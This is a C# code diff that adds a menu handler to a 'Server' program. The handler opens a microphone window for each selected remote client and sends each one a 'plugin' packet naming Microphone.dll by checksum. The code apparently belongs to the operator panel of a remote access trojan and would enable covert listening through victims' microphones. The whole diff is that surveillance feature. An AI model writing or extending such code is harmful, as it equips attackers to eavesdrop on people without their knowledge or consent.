@@ -623,6 +623,41 @@ namespace Server
 
         }
 
+        private void MicrophoneToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                if (listView1.SelectedItems.Count > 0)
+                {
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Packet").AsString = "plugin";
+                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Microphone.dll"));
+
+                    foreach (Clients client in GetSelectedClients())
+                    {
+                        FormMicrophone micForm = (FormMicrophone)Application.OpenForms["Microphone:" + client.ID];
+                        if (micForm == null)
+                        {
+                            micForm = new FormMicrophone
+                            {
+                                Name = "Microphone:" + client.ID,
+                                F = this,
+                                Text = "Microphone:" + client.ID,
+                                ParentClient = client,
+                            };
+                            micForm.Show();
+                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+                        }
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message);
+                return;
+            }
+        }
+
 
         #endregion
 
